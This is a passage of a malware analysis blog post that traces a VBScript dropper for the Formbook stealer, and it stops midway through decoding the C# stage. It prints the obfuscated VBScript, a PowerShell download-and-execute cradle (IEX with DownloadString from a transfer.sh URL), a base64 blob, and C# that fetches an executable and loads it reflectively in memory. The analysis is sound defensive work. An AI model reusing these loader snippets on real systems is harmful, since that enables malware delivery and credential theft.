<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Formbook Distributed Via VBScript, PowerShell, and C# Code" /><meta property="og:locale" content="en" /><meta name="description" content="Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbook and distribute it to victims in an opportunistic fashion. This is really similar to the model of buying other stealers like Redline or RATs like Netwire. In this blog post, I’ll walk through the analysis of a VBScript designed to eventually drop Formbook to a victim. For those following along at home, the sample I’m working with is here in MalwareBazaar: https://bazaar.abuse.ch/sample/db00c50095732ed84821f321b813546431f298525fea8dbd1a4545c3abfa1fe1/." /><meta property="og:description" content="Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbook and distribute it to victims in an opportunistic fashion. This is really similar to the model of buying other stealers like Redline or RATs like Netwire. In this blog post, I’ll walk through the analysis of a VBScript designed to eventually drop Formbook to a victim. For those following along at home, the sample I’m working with is here in MalwareBazaar: https://bazaar.abuse.ch/sample/db00c50095732ed84821f321b813546431f298525fea8dbd1a4545c3abfa1fe1/." /><link rel="canonical" href="https://forensicitguy.github.io/formbook-via-vbs-powershell-and-csharp/" /><meta property="og:url" content="https://forensicitguy.github.io/formbook-via-vbs-powershell-and-csharp/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-03-25T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Formbook Distributed Via VBScript, PowerShell, and C# Code" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-03-25T00:00:00+00:00","description":"Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbook and distribute it to victims in an opportunistic fashion. This is really similar to the model of buying other stealers like Redline or RATs like Netwire. In this blog post, I’ll walk through the analysis of a VBScript designed to eventually drop Formbook to a victim. For those following along at home, the sample I’m working with is here in MalwareBazaar: https://bazaar.abuse.ch/sample/db00c50095732ed84821f321b813546431f298525fea8dbd1a4545c3abfa1fe1/.","headline":"Formbook Distributed Via VBScript, PowerShell, and C# Code","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/formbook-via-vbs-powershell-and-csharp/"},"url":"https://forensicitguy.github.io/formbook-via-vbs-powershell-and-csharp/"}</script><title>Formbook Distributed Via VBScript, PowerShell, and C# Code | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/images/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tony Lambert</a></div><div class="site-subtitle font-italic">An educator that does security things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener"> <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener"> <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Formbook Distributed Via VBScript, PowerShell, and C# Code</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Formbook Distributed Via VBScript, PowerShell, and C# Code</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1648166400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-25 </em> </span> <span> Updated <em class="timeago" data-ts="1648508960" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-03-28 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1356 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p>Formbook is one of the threats that I categorize as part of the “background noise of exploitation” on the internet. While targeted attacks occur in scoped areas, anyone can go buy access for Formbook and distribute it to victims in an opportunistic fashion. This is really similar to the model of buying other stealers like Redline or RATs like Netwire. In this blog post, I’ll walk through the analysis of a VBScript designed to eventually drop Formbook to a victim. For those following along at home, the sample I’m working with is here in MalwareBazaar: <a href="https://bazaar.abuse.ch/sample/db00c50095732ed84821f321b813546431f298525fea8dbd1a4545c3abfa1fe1/">https://bazaar.abuse.ch/sample/db00c50095732ed84821f321b813546431f298525fea8dbd1a4545c3abfa1fe1/</a>.</p><h2 id="triaging-the-file"><span class="mr-2">Triaging the file</span><a href="#triaging-the-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>To start off, let’s verify the first stage is a VBScript. We can use a combination of <code class="language-plaintext highlighter-rouge">file</code>, <code class="language-plaintext highlighter-rouge">xxd</code>, and <code class="language-plaintext highlighter-rouge">head</code> to do this.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/formbook-vbs$</span><span class="w"> </span>file revised-invoice.vbs 
<span class="go">revised-invoice.vbs: ASCII text, with CRLF line terminators

</span><span class="gp">remnux@remnux:~/cases/formbook-vbs$</span><span class="w"> </span>xxd revised-invoice.vbs | <span class="nb">head</span>
<span class="go">00000000: 4d4e 4342 4243 5842 4e43 5842 4e58 4242  MNCBBCXBNCXBNXBB
00000010: 4d43 5842 4358 4d58 434e 5843 424e 203d  MCXBCXMXCNXCBN =
00000020: 2022 5722 2622 5322 2622 6322 2622 5222   "W"&amp;"S"&amp;"c"&amp;"R"
00000030: 2622 6922 2643 4852 2838 3029 2622 742e  &amp;"i"&amp;CHR(80)&amp;"t.
00000040: 2226 2273 2226 2268 2226 4348 5228 3639  "&amp;"s"&amp;"h"&amp;CHR(69
00000050: 2926 224c 2226 224c 220d 0a53 6574 2042  )&amp;"L"&amp;"L"..Set B
00000060: 4e43 585a 4d58 5842 4e58 424e 4358 4e4d  NCXZMXXBNXBNCXNM
00000070: 4358 424e 4358 4e43 434e 5858 4e43 5842  CXBNCXNCCNXXNCXB
00000080: 4d43 584d 4a48 4453 4453 4a20 3d20 4372  MCXMJHDSDSJ = Cr
00000090: 6561 7465 4f62 6a65 6374 284d 4e43 4242  eateObject(MNCBB
</span></pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">file</code> output of “ASCII text” is consistent with what I expect from a VBScript file, it should be just text in a file. The <code class="language-plaintext highlighter-rouge">xxd</code> output is consistent as well. The ASCII representation of the bytes on the right side show plain text. We can take a look at the contents here:</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">MNCBBCXBNCXBNXBBMCXBCXMXCNXCBN</span> <span class="o">=</span> <span class="s">"W"</span><span class="o">&amp;</span><span class="s">"S"</span><span class="o">&amp;</span><span class="s">"c"</span><span class="o">&amp;</span><span class="s">"R"</span><span class="o">&amp;</span><span class="s">"i"</span><span class="o">&amp;</span><span class="n">CHR</span><span class="p">(</span><span class="mi">80</span><span class="p">)</span><span class="o">&amp;</span><span class="s">"t."</span><span class="o">&amp;</span><span class="s">"s"</span><span class="o">&amp;</span><span class="s">"h"</span><span class="o">&amp;</span><span class="n">CHR</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">&amp;</span><span class="s">"L"</span><span class="o">&amp;</span><span class="s">"L"</span>
<span class="k">Set</span> <span class="n">BNCXZMXXBNXBNCXNMCXBNCXNCCNXXNCXBMCXMJHDSDSJ</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="n">MNCBBCXBNCXBNXBBMCXBCXMXCNXCBN</span><span class="p">)</span>
<span class="n">UIWUEWIUIEWUYEIUEWWUEWEIEWU</span> <span class="o">=</span> <span class="s">"Po"</span>
<span class="n">JHDSJHDSHJDSJHDSJHDSJJDSSDSHDSJHDSJHSJDSJDSJ</span> <span class="o">=</span> <span class="s">"W"</span><span class="o">&amp;</span><span class="n">CHR</span><span class="p">(</span><span class="mi">69</span><span class="p">)</span><span class="o">&amp;</span><span class="s">"RshE"</span>
<span class="n">HSDHDSHJDSJHDSJHDSJHSDJHDSJHDSJHDSJSDJDJDSJ</span> <span class="o">=</span> <span class="s">""</span><span class="o">+</span><span class="n">UIWUEWIUIEWUYEIUEWWUEWEIEWU</span><span class="o">+</span><span class="n">JHDSJHDSHJDSJHDSJHDSJJDSSDSHDSJHDSJHSJDSJDSJ</span><span class="o">+</span><span class="s">"LL -exeCutiO BYpASS -C  I`eX(n`EW-Ob`J`EcT nET`.weBCLi`ENt).DoWnloAdStRiNG('hxxps://transfer[.]sh/get/9GqmOG/jramooooss.ps1') "</span>
<span class="n">BNCXZMXXBNXBNCXNMCXBNCXNCCNXXNCXBMCXMJHDSDSJ</span><span class="p">.</span><span class="n">Run</span><span class="p">(</span><span class="n">HSDHDSHJDSJHDSJHDSJHSDJHDSJHDSJHDSJSDJDJDSJ</span><span class="p">),</span><span class="mi">0</span>
</pre></table></code></div></div><p>Just looking at the code above gives us a couple leads. First, the <code class="language-plaintext highlighter-rouge">transfer[.]sh</code> URL looks like it downloads some code to execute in PowerShell. We can clean up the code a bit to see what the simplified script would be:</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">Set</span> <span class="n">WscriptShell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
<span class="n">WscriptShell</span><span class="p">.</span><span class="n">Run</span><span class="p">(</span><span class="s">"powershell -exeCutiO BYpASS -C  I`eX(n`EW-Ob`J`EcT nET`.weBCLi`ENt).DoWnloAdStRiNG('hxxps://transfer[.]sh/get/9GqmOG/jramooooss.ps1') "</span><span class="p">),</span><span class="mi">0</span>
</pre></table></code></div></div><p>The PowerShell command issued by this script will then cause <code class="language-plaintext highlighter-rouge">wscript.exe</code> to spawn <code class="language-plaintext highlighter-rouge">powershell.exe</code>, download code from <code class="language-plaintext highlighter-rouge">transfer[.]sh</code>, and execute it using an Invoke-Expression cmdlet.</p><h2 id="examining-the-powershell"><span class="mr-2">Examining the PowerShell</span><a href="#examining-the-powershell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>To get further in the next step, we can examine <code class="language-plaintext highlighter-rouge">jramooooss.ps1</code>. After inserting some line breaks to beautify the code, we have:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$whatever</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"dXNpbmcgU3lzdGVtO3VzaW5nIFN5c3RlbS5JTzt1c2luZyBTeXN0ZW0uTmV0O3VzaW5nIFN5c3RlbS5SZWZsZWN0aW9uO3VzaW5nIFN5c3RlbS5UaHJlYWRpbmc7bmFtZXNwYWNlIG5TaGZWbER5akYuaXFCTGZDckZrQQp7cHVibGljIGNsYXNzIEJaVWxGTnh0R2d0Qk9xRFFQaVdSZVNpZ28Ke3ByaXZhdGUgY29uc3Qgc3RyaW5nIHl0WG5XV0dBSG1ERGtsdGlhbVZCYmtvbnI9Imh0dHBzOi8vdHJhbnNmZXIuc2gvZ2V0LzdFdVhxNS9SWUpHSkhKREdIUi5leGUiO3ByaXZhdGUgTWVtb3J5U3RyZWFtIFlTdE9jV0ljSGNKdElVdE9pbFpaSlhsYkE9bmV3IE1lbW9yeVN0cmVhbSgpO1tTVEFUaHJlYWRdCnB1YmxpYyB2b2lkIFpia2lwRVpsTnhqcm93UnZQTmx1cURma1UoKQp7bWRVcUtXd3pPUXJDdHlLVnRJaEdOUVhVaSgpO1pOV3JQbk55ZlBMaXpwUU1Sa2xXckNGdWooKTt9CnByaXZhdGUgdm9pZCBaTldyUG5OeWZQTGl6cFFNUmtsV3JDRnVqKCkKe2J5dGVbXWJ1ZmZlcj1ZU3RPY1dJY0hjSnRJVXRPaWxaWkpYbGJBLlRvQXJyYXkoKTtBc3NlbWJseSBhc3NlbWJseT1udWxsO2lmKEVudmlyb25tZW50LlZlcnNpb24uTWFqb3I+PTQpCntNZXRob2RJbmZvIG1ldGhvZD1UeXBlLkdldFR5cGUoIlN5c3RlbS5SZWZsZWN0aW9uLlJ1bnRpbWVBc3NlbWJseSIpLkdldE1ldGhvZCgibkxvYWRJbWFnZSIsQmluZGluZ0ZsYWdzLk5vblB1YmxpY3xCaW5kaW5nRmxhZ3MuU3RhdGljKTthc3NlbWJseT0oQXNzZW1ibHkpbWV0aG9kLkludm9rZShudWxsLG5ldyBvYmplY3RbXXtidWZmZXIsbnVsbCxudWxsLG51bGwsZmFsc2UsZmFsc2UsbnVsbH0pO31lbHNlCntNZXRob2RJbmZvIG1ldGhvZD1UeXBlLkdldFR5cGUoIlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5IikuR2V0TWV0aG9kKCJuTG9hZEltYWdlIixCaW5kaW5nRmxhZ3MuTm9uUHVibGljfEJpbmRpbmdGbGFncy5TdGF0aWMpO2Fzc2VtYmx5PShBc3NlbWJseSltZXRob2QuSW52b2tlKG51bGwsbmV3IG9iamVjdFtde2J1ZmZlcixudWxsLG51bGwsbnVsbCxmYWxzZX0pO30Kb2JqZWN0W11hcmdzPW5ldyBvYmplY3RbMV07aWYoYXNzZW1ibHkuRW50cnlQb2ludC5HZXRQYXJhbWV0ZXJzKCkuTGVuZ3RoPT0wKQphcmdzPW51bGw7YXNzZW1ibHkuRW50cnlQb2ludC5JbnZva2UobnVsbCxhcmdzKTt9CnByaXZhdGUgdm9pZCBtZFVxS1d3ek9RckN0eUtWdEloR05RWFVpKCkKe1dlYlJlcXVlc3QgcmVxdWVzdD1XZWJSZXF1ZXN0LkNyZWF0ZSh5dFhuV1dHQUhtRERrbHRpYW1WQmJrb25yKTtXZWJSZXNwb25zZSByZXNwb25zZT1yZXF1ZXN0LkdldFJlc3BvbnNlKCk7dXNpbmcoU3RyZWFtIHdlYl9zdHJlYW09cmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKSkKe2J5dGVbXWJ1ZmZlcj1uZXcgYnl0ZVs4MTkyXTtpbnQgcmVhZD0wO3doaWxlKChyZWFkPXdlYl9zdHJlYW0uUmVhZChidWZmZXIsMCxidWZmZXIuTGVuZ3RoKSk+MCkKe1lTdE9jV0ljSGNKdElVdE9pbFpaSlhsYkEuV3JpdGUoYnVmZmVyLDAscmVhZCk7fX0KcmVzcG9uc2UuQ2xvc2UoKTt9fX0="</span><span class="p">;</span><span class="w">
</span><span class="nv">$dec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Text.Encoding</span><span class="p">]::</span><span class="n">Utf8.GetString</span><span class="p">([</span><span class="n">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$whatever</span><span class="p">));</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="nv">$dec</span><span class="p">;</span><span class="w">
</span><span class="nv">$instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">nShfVlDyjF.iqBLfCrFkA.BZUlFNxtGgtBOqDQPiWReSigo</span><span class="p">;</span><span class="w">
</span><span class="nv">$instance</span><span class="o">.</span><span class="nf">ZbkipEZlNxjrowRvPNluqDfkU</span><span class="p">();</span><span class="w">
</span></pre></table></code></div></div><p>The PowerShell code is fairly brief. The <code class="language-plaintext highlighter-rouge">$whatever</code> variable contains base64-encoded text that soon gets decoded into <code class="language-plaintext highlighter-rouge">$dec</code>. Immediately after, PowerShell calls <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2"><code class="language-plaintext highlighter-rouge">Add-Type</code></a> and specified the decoded text as a TypeDefinition. This action assumes code passed into the TypeDefinition is .NET code, and PowerShell compiles that code into a .NET DLL module using the relevant compiler. After the .NET type gets compiled and added into PowerShell, the script creates an object of the type <code class="language-plaintext highlighter-rouge">nShfVlDyjF.iqBLfCrFkA.BZUlFNxtGgtBOqDQPiWReSigo</code> and calls the function <code class="language-plaintext highlighter-rouge">ZbkipEZlNxjrowRvPNluqDfkU()</code>.</p><blockquote><p>Sidebar- I’ve heard folks over the last few years say “PowerShell is dead, .NET is where the modern tradecraft is”. I strongly disagree, because I see PowerShell exploitation every day and modern adversaries simply mix PowerShell with .NET technologies.</p></blockquote><p>The question now is, what code went into that <code class="language-plaintext highlighter-rouge">Add-Type</code> call? We can decode the base64 chunk ourselves, revealing some C# code. I’ve gone ahead and added whitespace and renamed some of the function calls to make it easier to read.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Reflection</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Threading</span><span class="p">;</span>
<span class="k">namespace</span> <span class="nn">nShfVlDyjF.iqBLfCrFkA</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="k">class</span> <span class="nc">BZUlFNxtGgtBOqDQPiWReSigo</span>
    <span class="p">{</span>
        <span class="k">private</span> <span class="k">const</span> <span class="kt">string</span> <span class="n">exe_url</span><span class="p">=</span><span class="s">"hxxps://transfer[.]sh/get/7EuXq5/RYJGJHJDGHR.exe"</span><span class="p">;</span>
        <span class="k">private</span> <span class="n">MemoryStream</span> <span class="n">exe_memory_stream</span><span class="p">=</span><span class="k">new</span> <span class="nf">MemoryStream</span><span class="p">();</span>
        <span class="p">[</span><span class="n">STAThread</span><span class="p">]</span>
        <span class="k">public</span> <span class="k">void</span> <span class="nf">ZbkipEZlNxjrowRvPNluqDfkU</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nf">download_exe_to_memory_stream</span><span class="p">();</span>
            <span class="nf">memory_stream_to_reflective_load</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">private</span> <span class="k">void</span> <span class="nf">memory_stream_to_reflective_load</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="kt">byte</span><span class="p">[]</span><span class="n">buffer</span><span class="p">=</span><span class="n">exe_memory_stream</span><span class="p">.</span><span class="nf">ToArray</span><span class="p">();</span>
            <span class="n">Assembly</span> <span class="n">assembly</span><span class="p">=</span><span class="k">null</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="n">Environment</span><span class="p">.</span><span class="n">Version</span><span class="p">.</span><span class="n">Major</span><span class="p">&gt;=</span><span class="m">4</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">MethodInfo</span> <span class="n">method</span><span class="p">=</span><span class="n">Type</span><span class="p">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s">"System.Reflection.RuntimeAssembly"</span><span class="p">).</span><span class="nf">GetMethod</span><span class="p">(</span><span class="s">"nLoadImage"</span><span class="p">,</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">|</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span><span class="p">);</span><span class="n">assembly</span><span class="p">=(</span><span class="n">Assembly</span><span class="p">)</span><span class="n">method</span><span class="p">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">new</span> <span class="kt">object</span><span class="p">[]{</span><span class="n">buffer</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">false</span><span class="p">,</span><span class="k">false</span><span class="p">,</span><span class="k">null</span><span class="p">});</span>
            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">MethodInfo</span> <span class="n">method</span><span class="p">=</span><span class="n">Type</span><span class="p">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s">"System.Reflection.Assembly"</span><span class="p">).</span><span class="nf">GetMethod</span><span class="p">(</span><span class="s">"nLoadImage"</span><span class="p">,</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">|</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">Static</span><span class="p">);</span><span class="n">assembly</span><span class="p">=(</span><span class="n">Assembly</span><span class="p">)</span><span class="n">method</span><span class="p">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">new</span> <span class="kt">object</span><span class="p">[]{</span><span class="n">buffer</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">false</span><span class="p">});</span>
            <span class="p">}</span>
            <span class="kt">object</span><span class="p">[]</span><span class="n">args</span><span class="p">=</span><span class="k">new</span> <span class="kt">object</span><span class="p">[</span><span class="m">1</span><span class="p">];</span>
            <span class="k">if</span><span class="p">(</span><span class="n">assembly</span><span class="p">.</span><span class="n">EntryPoint</span><span class="p">.</span><span class="nf">GetParameters</span><span class="p">().</span><span class="n">Length</span><span class="p">==</span><span class="m">0</span><span class="p">)</span>
                <span class="n">args</span><span class="p">=</span><span class="k">null</span><span class="p">;</span><span class="n">assembly</span><span class="p">.</span><span class="n">EntryPoint</span><span class="p">.</span><span class="nf">Invoke</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="n">args</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">private</span> <span class="k">void</span> <span class="nf">download_exe_to_memory_stream</span><span class="p">()</span>
        <span class="p">{</span>
